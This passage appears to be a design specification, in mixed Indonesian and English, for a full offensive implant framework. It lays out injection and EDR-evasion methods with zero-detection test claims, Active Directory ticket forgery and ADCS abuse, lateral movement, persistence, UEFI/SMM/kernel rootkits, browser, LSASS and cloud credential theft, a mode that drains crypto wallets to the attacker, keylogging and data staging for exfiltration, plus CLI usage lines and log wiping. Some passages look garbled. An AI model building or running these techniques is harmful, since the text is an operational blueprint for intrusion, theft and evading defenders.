I4 **THREAD_HIJACK** — SuspendThread→SetBP→Resume. simpan & restore ctx asli.
I5 **MODULE_STOMP** — overwrite legit .text (iloop T8).
I6 **REFLECTIVE_DLL** — load dalam memor / resolve import & reloc internal + DllMain.
I7 **SECTION_MAPPING** — NtCreateSection→NtMapViewOfSection (both processes) → 
   RW di src, RX di target; hindari WriteProcessMemory (pattern mudah).
I8 **MODULE_SMUGGLE** — eksekusi via "loader" module legit (w3wp hooks) dengan 
   konteks DXGI/browser child; hijack DLL load-order (untuk persistence L9 partner).

**FALLBACK:** I7 → I3 → I4 → I6 → I2 → I1 → I5 (urutan = minimal signature).
**ENV/ADAPTASI:** proses target dipilih dari profil (winlogon > RuntimeBroker >
dllhost > edge helper). Parent-chaining hilangkan: hak yang diperlukan.

### 9.8 Test (total kolom Layer 6 sebagai barchart)
```
EV-19  full belt BAR: sleep+gate+amsi+inject gabungan, 1 session
        (env CrowdStrike 6.45 + Sysmon 15.2, 25 menit soak) → 0 deteksi
EV-20  each technique isolated di env S1 + Defender → 0 deteksi per-teknik
EV-21  memory scanning (YARA-like) saat sleep (T5/T11 → 0 plaintext in dump)
EV-22  crash-recovery: 10x teknik gagal (simulate DR0 hit) → fallback works
EV-23  inject ke RuntimeBroker (CRT) vs (section) → IOCTL sign diff sign-off
EV-24  log cleanup: wevtutil clear after heavy check-in → event gaps < 50
```

### 9.9 Cara pakai
```
implant-evasion --sleep ekko --gate indirect --amsi veh --unhook N3
implant-evasion --profile crowdstrike   # paksa table 9.6
implant-evasion --dry-run 2m            # self-test env sebelum fire
```

### 9.10 Extra tools tambahan (L6)
- **JITTER_ANTI_TIMING** — kontrol waktu eksekusi (jitter per tech block) supaya
  anti-timing detector (Matan_rtdsc) tidak bisa correlate sleep→action.
- **CALL_STACK_DECOY** — buat return-address list meniru `CommonMain` stack
  (null frame dsb) yang aktif di thread utama saat idle.
- **FG_KICKER** — deteksi threadpool FabricGuard → bypass ke N3/N4 path.
- **CONTAINER_GUARD_PROBE** — deteksi kernel "guarded" (minifilter callback) 
  sebelum crit-hot action.

## 10. LAYER 7 — ACTIVE DIRECTORY ATTACK

### 10.1 Modul KERBEROS (12 teknik + 2 baru)

K1 **GOLDEN_TICKET** — forge TGT: dump krbtgt hash (DCSync), buat ticket PAC
   (user SID, domain SID, grouP membership 500 DA, flags forwardable),
   sign AES256/RC4; lifetime 10y; inject.
   Counter-evidence: Event 4768/4769 anomali; rotasi krbtgt 2x.
K2 **SILVER_TICKET** — forge TGS dengan service key (hash service akun).
   Set lifetime wajar (bukan 10y) — menipu SIEM duration check.
K3 **DIAMOND_TICKET** — request TGT legit, decrypt PAC (krbtgt key), modif
   (add DA SID), re-sign → legitimate-issued ticket, pac modif.
   Lebih sulit dideteksi vs golden (ticket berasal dari request asli).
K4 **SAPPHIRE_TICKET** — TGT legit dimodif struktur (bukan decrypt PAC), injeksi
   extra SID via ticket manipulation; kalau DC gagal validasi pac → kekebalan.
K5 **SHADOW_CRED** — add msDS-KeyCredentialLink ke user; pakai PKINIT cert;
   persist { deviceKey } di LDAP.
   Counter: Event 5136 pada msDS-KeyCredentialLink.
K6 **KERBEROAST** — SPN enum → request TGS → hashcat -m 13100.
K7 **ASREPROAST** — user tanpa preauth → AS-REP crack.
K8 **PTT** — dump tgt/tgs via LSASS (kernel Rubeus/Mimikatz), inject session.
K9 **OVERPASS_HASH** — NTLM hash → TGT (RC4 asktgt) tanpa password.
K10 **TICKET_DUMP** — dump semua session tickets (kerb ticket / klist cache).
K11 **SKELETON_KEY** — patch LSASS misc::skeleton (universal password); EDR tinggi.
K12 **KERBEROS_ENCRYPTION_DOWNGRADE** — paksa AES→RC4 (enc type coercion)
   bila kebijakan mengizinkan (JIT outlier), buka jalan OPH/roasting.
K13 **AST** **FAST/SECURE_CHANNEL_BYPASS** — abuse pSK auth (machine account)
   untuk mendapatkan TGT tanpa password (R8009 variant).
K14 **RODC_KERBEROS** — jika RODC terpisah di segmen: gunakan K9 dari sisi RODC
   (krbtgt partial hash didapat) → blast radius RODC-only (siluman).

FALLBACK CHAIN: K1→K3→K4 (by-attack-vector), K5→K6→K7 (by-cred), K14→K13 (by-edge),
   K8↔K12 (by-invasive). Urutan dipilih adapter berdasarkan privilege level:
   - punya DA cred → K1/K2/K3 (mint)
   - cred user biasa → K5/K6/K7/K12 (roast)
   - network-only → K14 (RODC path) atau relay L8.

ENV_DETECT/ADAPTASI:
- Domain function level → pilih AES (modern) vs RC4 (legacy).
- RODC present → prefer path RODC (siluman for SD scope).
- Legacy trusts → abuse trust key (inter-realm) → K1.

### 10.2 Modul ADCS (ESC1–ESC16)

Ini RANGKAIAN penuh (ringkas — detail tiap ESC di v3.2 punya; sini di-remix jadi
adapter + fallback, kuncinya: ESC adalah chain, bukan list):

```
ESC1 (template + SAN) ──► ESC2 (anyEKU) ──► ESC3 (agent + RA) ──► ESC4 (ACL write)
ESC5 (CA ACL) ─◄ ESC6 (EDITF_SAN2) ─◄ ESC7 (manajerCA) 
ESC8 (HTTP+NTLM relay) ─ ESC9 (no ext) ─ ESC10 (weak map) ─ ESC11 (NTLM enroll)
ESC12 (HTTP relay) ─ ESC13 (app policy) ─ ESC14 (map vuln) ─ ESC15 (schannel) ─ ESC16 (sec ext bypass)

ADAPTER PRIORITY (pakai Certipy-scan → CERT_LEDGER):
  1. ESC1/ESC6 (bila template/CA terbuka) → SAN admin
  2. ESC8/ESC11/ESC12 (bila HTTP/NTLM enroll terbuka) → relay
  3. ESC4/ESC5/ESC7 (bila ACL permisif) → modif template
  4. ESC3 (RA agent) → provider-agent
  5. ESC9/ESC10/ESC14 (mapping) → trusting-mismatch
  6. ESC2 → anyPurpose EKU
FALLBACK: ESC1→ESC8→ESC4→ESC3→ESC6→ESC9→ESC10→ESC14→ESC2→alert

COUNTER-EVIDENCE per ESC: event 4886 (cert request), 4887 (issued), 5136 (AD change),
  NTLM relay logs. Langkah mitigasi wajib dalam laporan (Section 22).
```

### 10.3 Modul DCSYNC (3 variant)
D1 **DRSUAPI_DIRECT** — pakai GetNCChanges (DRSR) sebagai user DA/repl.
D2 **REPLICATION_RELAY** — relay cred relatif (NTLM) ke LDAP sign → kirim 
   request repl via modified SPN; sesuaikan skenario NTDS.dit via VSS.
D3 **VSS_SHADOW** — create VSS shadow → copy NTDS.dit + SYSTEM → offline parse.
FALLBACK: D1→D2→D3. Counter: monitor 4662 (repl), block 3rd-party LSA.

### 10.4 Modul DELEGATION (3 + 1)
L1 **UNCONSTRAINED** — abuse user/MACHINE with unconstrained delegation; auto-TGT
   crypt (look for trust gully). counter: Event 4769/4768.
L2 **CONSTRAINED** — S4U2Self→S4U2Proxy, get ticket ke service via s4u.
L3 **RBCD** — resource-based: SD pada target COMPUTER object; abuse Write on
   msDS-AllowedToActOnBehalfOfOtherIdentity umat; s4u on behalf to attacker.
L4 **SILVER+S4U** — combo: silver untuk service yang jadi victim L2.
FALLBACK: L3 (paling mudah kadang silent) → L1 → L2 → L4.

### 10.5 Modul RECON (8 komponen)
Domain, User (net user / LDAP / KerberosName), Group (recursive read),
SPN (setspn → L6 roaster), GPO (edge: GPP_password), OU, Trust (TDO enum),
Site. **FAST_PATH**: ambil via LDAP binder dengan kecepatan kanalisasi,
  hindari RID brute (noisy). Semua hasil → graph DB (L14).

### 10.6 Modul PERSIST AD (5)
ADP1 golden (K1), ADP2 shadow cred (K5), ADP3 AdminSDHolder owner (ACL write),
ADP4 DCSync replicate-backs (user tambahan repl), ADP5 group links callback
(schema/CA doppelganger). Counter di buku mitigasi.

### 10.7 Fallback silang + EDGE (ringkas)
```
EDGE-01: EDR update (krbtgt detect baru) → 1.kill golden plan, gunakan shadow-cred
EDGE-02: DC block LSA → 1.re-router ke DC cadangan (repl-enabled) 2. pakai RODC
EDGE-03: account locked → re-auth via cred store, jitter spray
EDGE-04: persistence purged (ticket purge on DC) → re-issue K3 diamond (request-asli)
EDGE-05: cred rotate (target pwd changed) → re-harvest via L11, re-kerberoast
EDGE-06: segment move → re-LDAP discovery, update graph
EDGE-07: operator offline → queue ticket ops, hold blast
EDGE-08/09: DMS → wipe ticket cache + krbtgt material from mem
EDGE-10: forensik ticket replay detect → switch to shadow-cred & remove ticket artifacts
```

### 10.8 Test
```
AD-01 golden→PTT (DA)           env: Win2022 domain, SIEM alert pks → gap
AD-02 ESC1→DA cert (Certipy)    env: default CA template
AD-03 ESC8 relay (NTLM→HTTP)    env: http enroll enabled → 0 step beyond
AD-04 RBCD abuser nasional       env: target LocalGroup admin abuse
AD-05 shadow cred persist        env: shadow → PKINIT → DA work as target
AD-06 DCSync krbtgt/PAC disturb  env: DRSUAPI vs VSS variant compar
AD-07 kerberoast AES→RC4 downgrade chain
ITERASI: tiap teknik dijalankan 3x (variasi parametrik + fallback trigger)
```

### 10.9 Usage
```
ad --domain corp.local --recon all --save-graph
ad --technique golden --krbtgt-hash <h> --user svc_adm --ptt
ad --technique esc1 --ca CA01 --template VulnTemp --san da
ad --dcsync --variant vss
```

### 10.10 Extra tools tambahan
- **AD_TRUST_MAP** — inter-realm trust matrix (compress untuk golden tier-2).
- **GPO_FINDER** — GPO yang men-scatter GPP password (legacy).
- **RODC_SHADOW** — temp account di RODC, repl content via KRBTGT partial.

---

## 11. LAYER 8 — LATERAL MOVEMENT

### 11.1 Modul SMB (8)
S1 **PSEXEC** — service create+exec (Admin$ share), binary drop → clean up.
S2 **SMBEXEC** — non-interactive: Named pipe STDIN/OUT parsing; no binary drop
   → forensik lebih bersih.
S3 **ATEXEC** — schtasks/CreateJob via IPC$; no serv file.
S4 **WMEXEC** — WMI + cscript wrapper (vbs dropped, cleanup); 
S5 **DCOMEXEC** — activic (MMC20/ShellWindows/Excel) → run command,
   no new service.
S6 **SERVICE** — sc create / sc start / sc delete (persist service variant).
S7 **NAMED_PIPE** — fake named pipe relay: capture SMB connect → forward
   (kombinasi L8 pivot).
S8 **PTH** — pass-the-hash: NTLM hash langsung SMB session (tanpa crack).

FALLBACK: S2→S1→S4→S5→S3→S8→S6→S7 (prioritas yang paling sedikit artefak).

### 11.2 Modul SMB_BEACON (2)
B1 **NAMED_PIPE_BEACON** — \.\pipe\msagent_<rand>; peer antara 2 node.
B2 **P2P_BEACON** — mesh: agent-to-agent relay tanpa command server direct.

### 11.3 Modul WMI, WINRM, DCOM, RDP, SSH, PSREMOTE (chain kompak)

```
WMI (5): W1 enum (CIM local) W2 auth (WMI namespace) W3 exec (Invoke-WmiMethod)
         W4 persist (WMI EventSubscription) W5 privesc (WMI privilege check)
         fall: W1→W3→W5→W4
WINRM (4): M1 auth cross-check M2 exec via WSMan (HTTP-SIM) M3 shell (PS 5985/6
         NTLM/keber) M4 session (WSManSession busy)
         fall: M2→M3→M4→M1
DCOM (5): D1 MMC20.Application, D2 ShellWindows, D3 Excel.Application (comsvc),
         D4 Outlook (MAP) D5 HTTPEX (regsvr route)
         fall: D1→D5→D2→D3→D4
RDP (5): R1 auth (password/pmk) R2 connect/session R3 tunnel (port forward
         via RDP) R4 session hijack (tscon SESSION miss >= SYSTEM) 
         R5 shadow (mstsc /shadow:<id>)
         fall: R4→R3→R2→R1
SSH (4): P1 auth (key/pass) P2 exec P3 tunnel (ssh -D socks) P4 agent forward
         fall: P1→P3→P2→P4
PSREMOTE (4): K1 session K2 exec K3 scriptblock (AMSI eat via L6) K4 Just
         Enough Admin bypass
```

### 11.4 Modul PIVOT (5)
V1 **SOCKS5** local-remote proxy, V2 **PORT_FORWARD** (any TCP), 
V3 **TCP_TUNNEL**, V4 **DNS_TUNNEL** (kombinasi L23), V5 **ICMP_TUNNEL**.
Routing table update di event bus (pivot path life). 

### 11.5 Fallback berdasarkan port & service fingerprint
```
1. fingerprint service (L17) port 445 → SMB path
2. port 5985/5986 → WinRM path
3. port 135 → DCOM path
4. 3389 → RDP path
5. 22 → SSH path
6. combo: gunakan service yang paling dekat dengan SKU tingkat (Admin)
ADAPTER: jika 445 closed tapi 139 open → fallback netbios (B in style)
```

### 11.6 EDGE + Test (ringkas)
```
EDGE-02 service block → switch protocol (SMB-close → DCOM)
EDGE-06 segment → re-scan, update pivot table, route via V3
LTM-01 PsExec no binary drop (via SMBExec) → windows defender no 4d
LTM-02 PTH terhadap DA via 445/TLS (env WS 2022)
LTM-03 DCOM exec via Excel for availability (2019+)
LTM-04 pivot: SOCKS5 → internal-only target web (internal from killed DC)
LTM-05 mesh: 3-node P2P beacon scg path (no internet edge)
```

---

## 12. LAYER 9 — PERSISTENCE

### 12.1 Windows (13 teknik)
P1 **REGISTRY** Run/RunOnce + value di user & HKLM, StartupApproved\Run.
P2 **SCHEDULED_TASK** dihasilkan via schtasks /XML + per-user/System (hidden).
P3 **SERVICE** (binpath + start:auto; cleanup race).
P4 **WMI_SUB** — event subscription (__EventFilter + ActiveScriptEventConsumer). 
P5 **STARTUP_FOLDER** .lnk/.vbs/.ps1.
P6 **ADS** — NTFS alternate data stream di file legit.
P7 **DLL_SIDELOAD** — dll di folder app yang trusted (ver state, teams, etc)
   mengeksploit load-order hijack (verifikasi sema).
P8 **COM_HIJACK** — InprocServer32 di key per-user yang menangkap CLSID dari
   proses tertentu. (fallback dari P7 bila app loader lock kejadwal)
P9 **APPINIT_DLLS** — (legacy; banyak EDR watch) reserve.
P10 **IFEO** — Debugger value di <exe> (image file execution options);
    akan execute 32-bit debugger untuk target (trick restart).
P11 **ACCESSIBILITY_STICKY** — sethc/EaseOfAccess binary swap (SYSTEM on login).
P12 **WOW64/HKCU** — variant 32-bit (kalau 64-bit EDR) map.
P13 **DLL_SEARCHORDER** — putihlist (App Paths) dalam Service Pak (kontra
    pilihan P7 bila avalibilitynya Sharing violation).

FALLBACK: P2→P3→P20? (urut: least-forensic: P2 > P7 > P8 > P5 > P1 > P4 > P10).
ADAPTER berdasarkan env: EDR yang watch Winlogon (P11) dipurge → pakai P2/P8.

### 12.2 Linux (10)
L1 cron, L2 systemd (unit service/timer), L3 rc.local, L4 profile/bashrc,
L5 SSH authorized_keys (backdoor key), L6 PAM (pam_exec), L7 udev (rule),
L8 initramfs (full-disk re-infect), L9 LD_PRELOAD (library ropet hijack),
L10 XDG autostart (desktop).
FALLBACK: L2→L1→L9→L5→L6→L7→L8 (prioritas yang bertahan reboot & rc).

### 12.3 macOS (8)
M1 LaunchDaemons (SYSTEM), M2 LaunchAgents (user), M3 cron, M4 SSH key,
M5 LoginItem (SMC), M6 kext/kmod (quest), M7 Dock proxy (hijack app launch),
M8 Spot index injection (SF2).
FALLBACK: M1→M2→M7→M5→M3→M4.

### 12.4 Android (6)
A1 Magisk module (riru) A2 BOOT_COMPLETED receiver A3 Foreground Service
A4 DeviceAdmin A5 AccessibilityService A6 WebView JS bridge inject.
FALLBACK: A2→A3→A5→A1→A4.

### 12.5 RE-PERSIST engine (watchdog)
```
- tiap 30s watchdog: verifikasi ≥1 persistence aktif di TECH_LEDGER(PERSIST)
- jika 0 → auto-reinstall dari backup mechanism berurutan (sesuai adapter L9)
- install ulang Juga pasca EDGE-04 (purge) → rebuild
- gunakan multi-chain: tidak semua disimpan di satu tempat
```

### 12.6 Edge + Test
```
EDGE-03/04: re-persist (backup chain). EDGE-08: purge semua persistence.
EDGE-10: reboot → login → persistence hidup (verifikasi).
PE-01 registry StartupApproved disable → fallback P2 task
PE-02 WMI sub RCE on event → command triggered
PE-03 DLL sideload vs EDR (Defender modern blocked load) → fallback P8
PE-04 Linux systemd survive reboot (fsck pass)
PE-05 macOS LaunchDaemon SYSTEM checkin
PE-06 Android BOOT_COMPLETED auto reconnect
PE-07 watchdog: delete 1 persistence → auto reinstall <90s
```

---

## 13. LAYER 10 — ROOTKIT (UEFI/SMM/FIRMWARE/RING-0)

### 13.1 UEFI (10)
U1 **DXE_INJECT** — inject DXE driver ke persistent var/EFI partition.
U2 **BOOT_CHAIN_HOOK** — hook pada Boot####/BootOrder + EFI_LOADED_IMAGE_PROTOCOL.
U3 **OSL_HOOK** — hook face (OS loader → handler) di SMST table.
U4 **CM_HOOK** — ConfigManager fix (driver install quirks).
U5 **SECURE_BOOT_BYPASS_MOK** — enroll MOK sendiri (black_mok) → sign driver.
U6 **SHIM_EXPLOIT** — CVE-chain shim: signed shim + our binary (boot).
U7 **DBX_BYPASS** — manipulate dbx variable (global) → unsigned boot.
U8 **ESP_PERSIST** — write payload ke EFI System Partition (boot survive OS wipe).
U9 **NVRAM_PERSIST** — store payload di NVRAM var (hidden).
U10 **FWU_UPDATE_HIJACK** — firmware update process interceptor (UEFI capsule).

FALLBACK: U8→U2→U1→U5→U6→U7→U9→U10 (by availability & signed requirement).

### 13.2 SMM (7)
S1 **HANDLER_INJECT** — SW SMI handler registrasi di SmiHandler.
S2 **SMRAM_EXPLOIT** — SMRAM overlap (chaos) → ring -2 buffer.
S3 **ROP_CHAIN** — SMRAM ROP (ret2smm via signal).
S4 **CALLOUT** — efivars callout table (mem leak → overwritten handler).
S5 **INTERRUPT_HOOK** — Global SMI via ACPI.
S6 **SELF_REINSTALL** — handler re-load setelah safe (reset) trigger.
S7 **S2M_DERIVE** — retire SMRAM parsing via SWSMI (build-time).

FALLBACK: S1→S4→S2→S3→S5→S6→S7.

### 13.3 FIRMWARE (6)
F1 SPI read/write (chipset lock readback), F2 JTAG (debug pogo), 
F3 UART console (8250/serial), F4 emulation (QEMU/chipsec install harness),
F5 IME/ME baze (hidden execution), F6 NVRAM diff (uEFI var map).

### 13.4 RING-0 kernel rootkit (TAMBAHAN — extra tools, 8)
R1 **DKOM** — hide process/thread dari PsActiveProcessHead.
R2 **SSDT_HOOK** — patch system call table (deprecated on W10+; pasokan patchguard).
R3 **CALLBACK** — PsSetCreateProcessNotifyRoutine (invisible exec).
R4 **MINIFILTER** — file hide/api reroute via IRP.
R5 **KPROCESS_CHAIN** — token stealing (token theft ring0).
R6 **PLAIN_DRIVER** — legit signed vuln driver (BYOVD) load → set cr0.
R7 **ETW_KILL** — patch ETW trace disable (kernel side).
R8 **HYPERVISOR_BLUE** — min-hypervisor (VBS) di bawah OS (mike future).

FALLBACK: R6 (BYOVD) fast → R3 → R4 → R5 (token) → R7 → R1. 
ADAPTER: PatchGuard active & VBS → prefer R6/R8 (peripheral, no kernel patch).

### 13.5 Env / Edge / Test
```
ENV: memetakan SecureBoot/VBS/PatchGuard via SMBIOS + UEFI vars.
EDGE: secure boot locked → MOK/shim path U5/U6; SPI write-protect → F2/F3;
      SMM denied → S3→S7 → fallback firmware.
HK-01 DXE driver survives reboot (VM OVMF) → re-checkin
HK-02 boot chain hook before OS decrypted partition → checkin (esp)
HK-03 MOK enroll → signed driver boots with Secure Boot ON
HK-04 SMM handler → ring -2 exec (OVMF SMM emulation)
HK-05 SPI readback → chip model + write verify (protect disable)
HK-06 BYOVD (signed vuln driver) → kernel token steal (Win11 with VBS)
```

### 13.6 Keterangan penting (safety check)
Bagian 13 berisi teknik ring-2/ring-0. Implementasi dilakukan hanya pada
environment uji berizin (lab OVMF/QEMU, target yang telah dimiliki).
Semua teknik punya kemampuan recovery: restore boot var + QEMU snapshot.

## 14. LAYER 11 — CREDENTIAL THEFT

### 14.0 Struktur

```
cred/
├── lsass/        # dump, remote dump, token steal
├── browser/      # MCE, ChromeElevator, RawCopy, DevGrabber + 3 baru
├── wallet/       # extension seed, metamask, phantom, coin98 + backup
├── vpn/          # OpenVPN, WireGuard, Pulse, GlobalProtect dump
├── gaming/       # Steam ssfn, Epic, Battle.net, Riot
├── file/         # ssh keys, netrc, github, gpg, keepass db, rdp stash
├── system/       # lsa secrets, dpapi, sam, cache, tokens, plaintext advisers
├── vault/        # hashi vault apis, k8s secrets, aws cli, azure cli
└── store/        # enkripsi-aes256-gcm + sync ke orchestrator
```

### 14.1 Modul LSASS (7)

L1 **PROCDUMP_STYLE** — mini dump via NtCreateFile + handle Duplicate dengan
   SeDebugPrivilege; anti-detection cepat (blokir Event 4663).
L2 **COM_SERVER_DUMP** — gunakan mode COM server (dumpert DLL) → mimic
   lsass.exe dump (slower, but exporter say it dual-use).
L3 **REFLECTIVE_MIMIKATZ_DUMP** — reflektor in-mem; no file di disk.
L4 **SSP_HOOK** — load sekarlisatsi (custom SSP) capture logon+LSASS plaintext.
L5 **HSLSDH** — dump via remote (dmp) ke mem patch dmpdiag; degrade:
   jika lokal blocked, gunakan L7 token-duplicate.
L6 **MiniDumpWriteDump** direct — kombinasi L3 di proxy process (notepad).
L7 **ETW_FULL** — abuse ETW-uint untuk telemetry logon (plaintext cross-trust).

FALLBACK: L1→L3→L2→L4→L5→L6→L7 (paling-forensic: L4/L7 tanpa file dump).

### 14.2 Modul BROWSER (9) — chain MCE→DBS→ChromeElevator→RawCopy + DevGrabber

```
MCE (Master Cookies Extractor) — cara:
  1. enumerasi profile Chrome/Edge/Brave/Opera/Vivaldi di tempat (filesystem)
  2. gabung Local State (key DPAPI) + Login Data (chrome v10-v13 decrypt)
  3. re-assemble cookie jar dengan flag httponly/secure domain masing-masing
  4. selective: hanya domain target-flow (gmail, okta, azure, aws, colunteer)
  5. cleanup: restore integrity state; EKS (EncryptedKeySet) version handling
DBS (Domain-Based Selector):
  - filter hostname flaggable per keperluan (token/aws) dan exclude secara 
    ad-hoc. Tanpa tekan disk, simpan via AES-256 + sodium.
ChromeElevator (per-domains Elevate, R)
  - izin akses yang lebih tinggi ke levels (cor/vpn/bank/internal) via 
    "elevated decision": ambil EXTRA dari cookies/creds yang didelegate
    (token scopes). Chain dipakai kena `Elevator` jar tanggung.
RawCopy (file copy via NTFS RAW)
  - copy "Login Data", "Local State", "Web Data" via backup-read (ir).
  - Menghindari AV file-monitor (database sqlite terkunci) — raw &
    tanpa kunci handle.
DevGrabber (dev console feeder)
  - enumerasi: .ssh/, .aws/, .azure/, .kube/, .gitconfig, .npmrc,
    codespaces? / .vscode server, gh auth, glab auth, Dozer-log,
    helm, terraform tfstate parses, docker config (registry auth), 
    node .env, python .env, kubernetes ~/.kube/config.
SUPPLEMENT (3 baru di luar v3.2):
  G1 AutoFill Grab — klik "Autofill settings" → baca saved addresses/cards
     (Data), termasuk battle caching.
  G2 SessionRestore — browser session "tab recovery" sniffer (restore list
     aktif → target URL untuk LangGraph decision).
  G3 SyncAccountSnatch — banyak browser menyimpan oauth refresh di 
     "Account Sync" → token valid untuk exfil meski cookies expired.
  G4 PaymentData — Google Pay / Apple Pay saved cards (encryption shift).
  G5 ChromeOSKeyRing — keyring DPAPI v2 decrypt dari credential manager.
```

FLOW EXECUSI (rantai, eksekusi via L15 brain orchestrator):
```
[phish/email] → sensor: domain penting → MCE full filter → DBS domain-pick
→ ChromeElevator elevate scope → RawCopy file raw (if primary locked)
→ DevGrabber dev-profiles → upload (event cred.collect.done)
```

### 14.3 Modul WALLET (7)
W1 **SEED_PHRASE** — scan browser**: MetaMask/Vault dirs (vault.json), 
   manual phrase copy-paste catch (via keylogger L6.net). 
W2 **KEYSTORE** — scan per-extension `Keystore` folder / .json (encrypted by
   password; capturar & kemudian crack).
W3 **EXT_MANIFEST_RECON** — cek extension enumerasi; target seed phrases export.
W4 **ER_APPROVE** — chakrachaintes & multi-chain sign approve (Phantom solana,
   Solflare). 
W5 **BROWSER_EXT_STORAGE** — pepper ISO (skip-enc) refresh toke Slain.
W6 **HONEYPOT_DETECT** — verify address/chain; chain-id spoof catch (aman).
W7 **TRANSFER_AUTOPILOT** — jika wallet aktif & chain faucet: kuras ETH/SOL/BTC 
   balance ke attacker (high trust requirement) — harus approved dulu.

### 14.4 Modul FILE & SYSTEM CRED (10)
F1 SSH key (~/.ssh), F2 netrc (all user), F3 keepass .kdbx (v2 kdbx4 crack),
F4 RDP stash (mstsc credentials), F5 git global cred Helpers, 
F6 DPAPI decrypt (masterkey with user profile/hash) — Windows:
   - v2 DPAPI (Vista+) master keys (2nd gen), LSA secrets extra.
F7 SAM/SYSTEM (sistem role ⇒ NTDS dump variant; local only), 
F8 LSA Secrets (Win 360s, secheven), F9 cached logons (Win join domain),
F10 PowerShell history / console host history (PSReadLine) — semua user.
F11 Environment variable enumerator (pass in env — CI geral).

### 14.5 Modul VPN (4)
V1 OpenVPN config + private key (user-auth creds), V2 WireGuard config dumps
   (preshared key file), V3 Pulse/SonicWall harvested NTLM (shared secret) via
   sso-hook, V4 GlobalProtect cookies (portal auth reuse).

### 14.6 Modul GAMING/OTHER (4)
G1 Steam SSFN (ssfn-* files: hijack login), G2 Epic config.json + 
   GT/access token tables, G3 Discord token (local storage leveldb), 
   G4 Slack token (local storage), G5 Telegram session (session sqlite).

### 14.7 Modul VAULT (5)
A1 HashiCorp Vault — unseal token grab if local agent `~/.vault-token`,
   API `vault kv get` on discovery, A2 Kubernetes — kubeconfig token serve
   (serverside kubectl-session), A3 AWS CLI — `~/.aws/credentials`/config
   profile scan + `env` STS creds, A4 Azure CLI — `~/.azure/azureProfile.json`
   + token double, A5 GCP — `application_default_credentials.json` (ADC).

### 14.8 STORE & SYNC
```
- Store: semua material masuk store/ dengan AES-256-GCM key per-instance
  (process-bound). Key di-memory; hash PIN. Tak ada decrypted di disk.
- Sync: event `cred.collect.done` → Orchestrator: label category, icongraph.
  - sink ke C2 (Section 4) sebagai beacon "creds" (meta-only). 
  - material utama: kirim via exfil channel L20/23 (raw) — tidak via 
    public endpoint.
```

### 14.9 Fallback (dengan kondisi EDR)
```
Jika lsass dump diblokir (ETW-hook/AV): → L4 SSP or L7 ETW (no file dump).
Jika browser DB SQLite terkunci: → RawCopy (NTFS raw) → decrypt local state.
Jika DPAPI master key locked: → ghost.ts_sys (DPAPI v3 shadows) 
    atu via actual user token login.
Jika EDR memanta proses lsass query (test): → restart system + dump early boot.
Orden: L1→L2→L3→L4→L5→L6→L7  dan MCE→RawCopy→ChromeElevator→DevGrabber.
```

### 14.10 EDGE + Clear
```
EDGE-04 token rotated → re-grab via browser active session (Live) 
EDGE-05 credential rotated → re-kerberoast / re-L7
EDGE-09 self-destruct: wipe cred store (AES-256 key wipe → unrecoverable)
EDGE-08 DMS: purge store + sync partial → boom
EDGE-01 new EDR heuristics → adapter, switch method family
CLEAR: setelah charm selesai → store wipe + zeroize material (per request)
```

### 14.11 Test
```
CR-01 MCE full: google+okta+aws cookies → decrypt → reuse 12h session env
CR-02 RawCopy sqlite locked (browser running) → still exfil OK
CR-03 ChromeElevator scope → token baru di deleg complex domain (Workspace)
CR-04 DevGrabber .aws/.kube/.ssh grab → profile auth test on new vm
CR-05 lsass L4 SSP (SSP register) → plaintext capture → no disk dump
CR-06 DPAPI masterkey → chrome v13 decrypt single-pass
CR-07 wallet keystore decrypt (ether scan test net)
CR-08 Vault token → `kv get` internal secret
CR-09 Steam SSFN → account hijack (test account only)
CR-10 store sync → orchestrator labeling correctness
```

### 14.12 Usage
```
cred lsass --method ssp       # L4: SSP hook: capture plaintext
cred browser --chain full     # MCE→DBS→Elevator→RawCopy→DevGrabber
cred browser --scope okta,aws --elevator
cred wallet --keystore /path --decrypt
cred vault --scan-local
cred store --wipe
```

### 14.13 Extra tools (tambahan v3.2)
- **PRIVACY_CACHE_EATER** — hapus traces MCE (Local State touched) + guid reset.
- **BROWSER_POSTMORTEM** — restore cookie entropy + re-key DPAPI class.
- **CRED_GRAPH_LINK** — hubungkan hasil cred ke graph AD (L7) & lateral matrix.

## 15. LAYER 12 — DATA COLLECTOR / EXFILTRATION

### 15.0 Struktur

```
collector/
├── scope/        # target classifier (confidential, PII, financial, trade-secret)
├── harvest/      # filesystem, mail, chat, db, cloud, clipboard, network
├── staging/      # chunk, dedupe, metadata graph
└── exfil/        # channel planner + mao (kombinasi L20/L23)
```

### 15.1 Modul SCOPE (6 classifier)
C1 **EXT_FILTER** — doc, docx, xls, xlsx, ppt, pptx, pdf, csv, sql, rar, 7z, zip,
   txt, md, json, xml, yaml (config), pem, key, cer, pfx, db, sqlite.
C2 **PATH_RULES** — /confidential, /finance, /HR, /legal, /secret (DC), per-user.
C3 **KEYWORD** — pattern scan (IAM, PRIVACY, NDA, CONTRACT, API_KEY, SECRET, 
   password=, token=, prod_public).
C4 **METADATA_STEER** — doc properties: author, cloud, internal 环境 flag.
C5 **PERMISSION_HINT** — ACL check (readable target enabler).
C6 **EXCLUSION** — exclude OS/system, transient temp, repair folder (avoid noise).

### 15.2 Modul HARVEST (12)
H1 **FILESYSTEM_MAP** — walker via Win32 API (accessible paths), size+hash 
   quick-SHA (dedup) inline.
H2 **MAIL_PULL** — Outlook (MAPI/COM), thunderbird (mbox/profil), evolution,
   gmail (IMAP with token) — inbox+archive label.
H3 **CHAT_PULL** — Slack/Discord/Teams (if Webhooks/cookies ok) — messages 
   + files history; Telegram session dir.
H4 **DB_PULL** — L3/L4/L5 data: tables high-value (users, payments, crm).
H5 **CLOUD_PULL** — Sharepoint/OneDrive/GDrive (via token dari L11 browser),
   download select folder policy.
H6 **CLIPBOARD** — clipboard monitor (interval) — strings → secret regex.
H7 **SCREENSHOT** — selective (dialog, ERP form) — not continous (noise).
H8 **KEYLOG** — keyboard hook (low-level, dll inject) — event input buffer 
   (target-field only: login, password, token, 2FA).
H9 **AUDIO/REC** — mic passthrough (need explicit claar; jarang dipakai).
H10 **PRINTER_SPOOLER** — buffalo spool file inc (doc yang dicetak).
H11 **NETWORK_SNIFF** — timeout on trusted port (443, 80) plain (TLS sisakan?)
   pasive capture (L23 sudah TLS; ini plaintext backend).
H12 **HONEYPOT_ELIGIBILITY** — detect fake doc/lex (bunny hop) → verify.

### 15.3 Modul STAGING (5)
S1 dedupe+chunking (encrypt per chunk AES-CTR) 
S2 metadata graph (L14 store) — owner, path, security label
S3 size budget throttling (rate limit supaya tidak trigger network DLP)
S4 deny-list editor (excl yang harus di-close oleh analyst)
S5 incremental sync (harvest delta only — speed)

